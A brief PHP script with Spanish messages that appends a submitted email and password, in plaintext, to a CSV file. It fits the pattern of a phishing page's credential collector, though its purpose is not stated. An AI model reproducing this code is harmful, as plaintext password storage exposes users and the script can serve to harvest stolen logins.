<?php 
	$archivo = fopen("archivo.csv","a+") or die ("No se pudo crear el archivo");
	fwrite($archivo, $_POST["txt-correo"]. ",". $_POST["txt-password"]."\n");
	fclose($archivo);
	echo "Registro almacenado";
?>

